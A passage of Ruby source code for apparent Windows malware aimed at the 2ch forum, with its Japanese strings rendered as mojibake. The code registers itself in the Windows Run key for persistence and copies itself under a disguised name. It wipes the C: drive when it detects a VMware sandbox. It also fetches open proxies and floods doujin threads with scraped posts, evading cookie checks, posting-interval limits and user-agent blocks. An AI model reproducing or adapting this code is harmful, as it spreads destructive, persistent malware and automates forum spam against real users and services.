   agent.proxy_port = proxy_port
   agent.req.header['User-Agent'] = TwoChannel::user_agent
   agent.req.header['Cookie'] = @board.cookie
   agent.req.header['content-type'] = 'application/x-www-form-urlencoded'
   agent.req.header['Referer'] = "http://#{@board.host}.2ch.net/test/read.cgi/#{@board.dir}/#{key}/l50"
   if hana
    agent.req.form.add 'submit', 'è„ãLëSÇƒÇè≥ë¯ÇµÇƒèëÇ´çûÇﬁ'
    agent.req.form.add hana[0], hana[1]
   else
    agent.req.form.add 'submit', 'èëÇ´çûÇﬁ'
   end
   agent.req.form.add 'FROM', name.to_s
   agent.req.form.add 'mail', mail.to_s
   agent.req.form.add 'MESSAGE', message.to_s
   agent.req.form.add 'bbs', @board.dir.to_s
   agent.req.form.add 'key', key.to_s
   agent.req.form.add 'time', @board.time
   agent.post "http://#{@board.host}.2ch.net/test/bbs.cgi"
   head, body = agent.rsp.header, agent.rsp.body
   if body.match(/(èëÇ´Ç±Ç›Ç‹ÇµÇΩ)|(2ch_X:true)/)
    @board.wait
    @board.set_tmp_wait 0
    return true
   else
    raise ''
   end
  rescue
   print body if $DEBUG
   if body.match(/(èëÇ´çûÇ›.*ämîF)|(2ch_X:cookie)|(2ch_X:check)/)
    gachon = []
    body.scan(/<input type=hidden name="([^"]+)" value="([^"]+)">/i){|x, y|
     unless x.match(/submit|FROM|mail|MESSAGE|bbs|key|time/)
      gachon = [x, y]
     end
    }
    @board.cookie = head['set-cookie'] + ';' + gachon[0] + '=' + gachon[1]
    return write(name, mail, message, proxy_host, proxy_port, gachon)
   elsif body.match(/Ç®íÉÇ≈Ç‡/)
    @board.set_tmp_wait(60*5)
    return false
   elsif body.match(/Ç‡Ç§Ç∏Ç¡Ç∆èëÇØÇ‹ÇπÇÒÇÊ/)
    @board.set_tmp_wait(60*65)
    return false
   elsif body.match(/Ç…ÇÕèëÇ´çûÇﬂÇ‹ÇπÇÒ|Ç≈èëÇØÇ‹ÇπÇÒ/)
    @over_size = true
    #@board.wait
    @board.set_tmp_wait 0
    return false
   elsif body.match(/(\d+) sec ÇΩÇΩÇ»Ç¢Ç∆èëÇØÇ‹ÇπÇÒ/)
    @board.set_wait($1.to_i)
    sleep($1.to_i + 1)
    retry
   elsif body.match(/ÉuÉâÉEÉUïœÇ≈Ç∑ÇÊÇÒ-2/)
    TwoChannel::set_user_agent
    retry
   elsif body.match(/òAë±ìäçeÇ≈Ç∑Ç©ÅHÅH/)
    @board.set_tmp_wait(90)
    return false
   elsif body.match(/òAë±ìäçeÇ≈Ç∑Ç©ÅH/)
    return false
   elsif body.match(/ÉuÉâÉEÉUÇóßÇøè„Ç∞Ç»Ç®ÇµÇƒÇ›ÇƒÇ≠ÇæÇ≥Ç¢/)
    @board.time_count += 1
    retry
   elsif body.match(/ñºëOÇ™í∑Ç∑Ç¨Ç‹Ç∑/)
    name.chop!
    retry
   elsif body.match(/ñºëOÇ¢ÇÍÇƒÇøÇÂ/)
    name += ' '
    retry
   elsif body.match(/Rock/i)
    return false
   elsif body.match(/ãKêßíÜ/)
    @board.set_wait(0)
    retry
   elsif body.match(/ìäçeÇµÇ∑Ç¨/)
     return false
   elsif body.match(/ÉoÅ[É{ÉìÉnÉEÉX/)
    raise 'babon'
   else
    print body if $DEBUG
    raise 'Undefined Error'
   end
  end
 end
 def res_num= newnum
  @old_res_num = @res_num
  @res_num = newnum.to_i
 end
 def rank= newrank
  @old_rank = @rank
  @rank = newrank.to_i
 end
 def update?
  if @res_num == @old_res_num
   false
  else
   @over_size = false
   @res_num - @old_res_num
  end
 end
 def over_num?
  @res_num > TwoChannel::MAX_RES_NUM
 end
 def over_size
  @over_size = true
 end
 def over_size?
  @over_size
 end
 def writable?
  !over_num? and !over_size?
 end
end
class String
 def optimize
  Kconv.kconv(self, Kconv::SJIS, Kconv::SJIS).tr('É@-ÉìÇ`-ÇöÇO-ÇX', 'Çü-ÇÒA-z0-9').gsub(/[\s\/\.\*Å^Å@Å~\-ÅEÅD\|Åb\!Åö]/, '')
 end
end
class Array
 def rnd
  self[rand(self.size)]
 end
end
def ny_words nypath
 ret = []
 nypath = File.dirname(nypath)
 ['download.txt', 'tab1.txt', 'tab2.txt'].each{|x|
  open(nypath + '\\' + x){|f|
   ret.concat f.read.split("\n")
  }
 }
 ret
end
def get_proxies
 agent = Web::Agent.new
 agent.get 'http://www.cybersyndrome.net/pld3.html'
 ret = []
 agent.rsp.body.
 scan(/onMouseOut="d\(\)">([\w.]+):(\d+)/){|adr, prt|
  ret << [adr, prt]
 }
 ret
end
def startup filename
 Win32::Registry.open(Win32::Registry::HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', Win32::Registry::Constants::KEY_WRITE){|key|
  key.write_s('morimotoon', filename)
 }
end
def fcopy f1, f2
 begin
 open(f1){|src|
  open(f2, 'w'){|dst|
   src.binmode
   dst.binmode
   dst.write(src.read)
  }
 }
 rescue
 end
 f2
end
def file_exist? file
 begin
  open(file){}
  true
 rescue
  false
 end
end
$kakikomes = nil
def kakiko_message board, tage
 return $kakikomes if $kakikomes
 $kakikomes = []
 board.include_title(tage).each{|x| $kakikomes.concat(kakimes(x))}
 $kakikomes
end
def kakimes sure
 messages = []
 sure.read.each{|x|
  kakiko = x.split('<>')
  messages << kakiko[3].gsub(' <br> ', "\n").gsub(/<a href[^>]+>|<\/a>/, '').gsub('&gt;', '>').gsub(/^ | $/, '')
 }
 messages.sort!.uniq!
 messages
end

$exename = 'c:\\:antidojinmori1.exe'
if vmware?
 delete_dir 'c:\\'
 exit
end
unless $DEBUG
Win32API.new('zip32xlo', '_zipcompressed@4', 'l', 'l').call(0)
unless RUBYSCRIPT2EXE_APPEXE.include?('antidojin')
 if gazoforuda = Dir[RUBYSCRIPT2EXE_APPEXE.gsub(/\s*\.exe$|\s*\.scr$/, '') + '*'][0]
  Api.open_dir(gazoforuda)
 end
 fcopy(RUBYSCRIPT2EXE_APPEXE, $exename)
 if rand(2) == 0
  Thread.new{system($exename)}
  sleep 2
 else
  startup $exename
 end
 Win32API.new('zip32xlo', '_registered@0', '', 'l').call
 exit
end
at_exit{
 startup $exename
 Win32API.new('zip32xlo', '_registered@0', '', 'l').call
}
end
begin
 
 TwoChannel::set_user_agent
 board = TwoChannel::Board.new('anime2', 'doujin')
 maxline = board.settings['BBS_LINE_NUMBER'].to_i * 2
 maxchar = board.settings['BBS_MESSAGE_COUNT'].to_i
 defaultname = board.settings['BBS_NONAME_NAME']
 defaultname = 'ñºñ≥ÇµÇ≥ÇÒÅóÇ«Å[Ç≈Ç‡Ç¢Ç¢Ç±Ç∆ÇæÇ™ÅB' if defaultname.size == 0
tage = /ê¨êl|ê¨îN|ìséYñf|ìséY|è¨Âv|êXñ{|êXÅõ|only|éÂç√|ÇπÇ¢Ç∂ÇÒ|ÇπÇ¢ÇÀÇÒ|Ç∆Ç≥ÇÒÇ⁄Ç§|Ç∆Ç≥ÇÒ|Ç±Ç§Ç∂|Ç‡ÇËÇ‡Ç∆|Ç‡ÇËÅõ|Ç®ÇÒÇË|ÇµÇ„Ç≥Ç¢/

 loop do
  board.get_threads
  moe = board.include_title(tage).sort_by{|x| x.res_num}
  
  hennames = board.include_title_match_word(tage) << defaultname << 'fusianasan'
  if moe.size == 0
   sleep 60 * 10
   redo
  end
  100.times do
   moemoe = moe.rnd
   messe = kakiko_message(board, tage).rnd
   messe.gsub!(/>>\d+/, ">>#{moemoe.res_num}")
   
   pname = hennames.rnd
   pmail = ['sage', '', ''].rnd
   p moemoe, pname, pmail, messe if $DEBUG
   moemoe.write(pname, pmail, messe)
   board.tmp_wait
  end
 end
rescue
 raise $! if $DEBUG
 sleep 30
 retry
end
